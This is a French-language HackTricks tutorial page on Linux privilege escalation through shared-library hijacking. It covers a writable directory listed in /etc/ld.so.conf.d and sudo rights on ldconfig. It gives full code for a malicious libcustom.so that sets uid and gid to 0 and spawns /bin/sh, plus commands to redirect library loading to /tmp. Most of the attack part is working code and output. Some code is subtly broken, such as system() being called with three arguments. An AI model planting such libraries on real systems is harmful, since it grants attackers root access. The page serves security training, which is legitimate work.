# ld.so privesc exploit example

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts github.

</details>
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}

## Préparer l'environnement

Dans la section suivante, vous pouvez trouver le code des fichiers que nous allons utiliser pour préparer l'environnement

{% tabs %}
{% tab title="sharedvuln.c" %}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{% endtab %}

{% tab title="libcustom.h" %}
```c
#include <stdio.h>

void vuln_func();
```
{% endtab %}

{% tab title="libcustom.c" %}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{% endtab %}
{% endtabs %}

1. **Créez** ces fichiers sur votre machine dans le même dossier
2. **Compilez** la **bibliothèque** : `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **Copiez** `libcustom.so` dans `/usr/lib` : `sudo cp libcustom.so /usr/lib` (privilèges root)
4. **Compilez** l'**exécutable** : `gcc sharedvuln.c -o sharedvuln -lcustom`

### Vérifiez l'environnement

Vérifiez que _libcustom.so_ est en train d'être **chargé** depuis _/usr/lib_ et que vous pouvez **exécuter** le binaire.
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
## Exploit

Dans ce scénario, nous allons supposer que **quelqu'un a créé une entrée vulnérable** à l'intérieur d'un fichier dans _/etc/ld.so.conf/_ :
```bash
sudo echo "/home/ubuntu/lib" > /etc/ld.so.conf.d/privesc.conf
```
Le dossier vulnérable est _/home/ubuntu/lib_ (où nous avons un accès en écriture).\
**Téléchargez et compilez** le code suivant à cet emplacement :
```c
//gcc -shared -o libcustom.so -fPIC libcustom.c

#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(){
setuid(0);
setgid(0);
printf("I'm the bad library\n");
system("/bin/sh",NULL,NULL);
}
```
Maintenant que nous avons **créé la bibliothèque malveillante libcustom à l'intérieur du chemin mal configuré**, nous devons attendre un **redémarrage** ou que l'utilisateur root exécute **`ldconfig`** (_dans le cas où vous pouvez exécuter ce binaire en tant que **sudo** ou s'il a le **bit suid**, vous pourrez l'exécuter vous-même_).

Une fois cela fait, **vérifiez à nouveau** d'où l'exécutable `sharevuln` charge la bibliothèque `libcustom.so` :
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Comme vous pouvez le voir, il **le charge depuis `/home/ubuntu/lib`** et si un utilisateur l'exécute, un shell sera exécuté :
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
{% hint style="info" %}
Notez que dans cet exemple, nous n'avons pas élevé les privilèges, mais en modifiant les commandes exécutées et **en attendant que l'utilisateur root ou un autre utilisateur privilégié exécute le binaire vulnérable**, nous pourrons élever les privilèges.
{% endhint %}

### Autres erreurs de configuration - Même vulnérabilité

Dans l'exemple précédent, nous avons simulé une erreur de configuration où un administrateur **a défini un dossier non privilégié dans un fichier de configuration dans `/etc/ld.so.conf.d/`**.\
Mais il existe d'autres erreurs de configuration qui peuvent causer la même vulnérabilité. Si vous avez **des permissions d'écriture** dans un **fichier de configuration** à l'intérieur de `/etc/ld.so.conf.d`, dans le dossier `/etc/ld.so.conf.d` ou dans le fichier `/etc/ld.so.conf`, vous pouvez configurer la même vulnérabilité et l'exploiter.

## Exploit 2

**Supposons que vous ayez des privilèges sudo sur `ldconfig`**.\
Vous pouvez indiquer à `ldconfig` **où charger les fichiers de configuration**, donc nous pouvons en profiter pour faire en sorte que `ldconfig` charge des dossiers arbitraires.\
Alors, créons les fichiers et dossiers nécessaires pour charger "/tmp":
```bash
cd /tmp
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Maintenant, comme indiqué dans l'**exploit précédent**, **créez la bibliothèque malveillante dans `/tmp`**.\
Et enfin, chargeons le chemin et vérifions d'où le binaire charge la bibliothèque :
```bash
ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Comme vous pouvez le voir, avoir des privilèges sudo sur `ldconfig` vous permet d'exploiter la même vulnérabilité.**

{% hint style="info" %}
{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts github.

</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
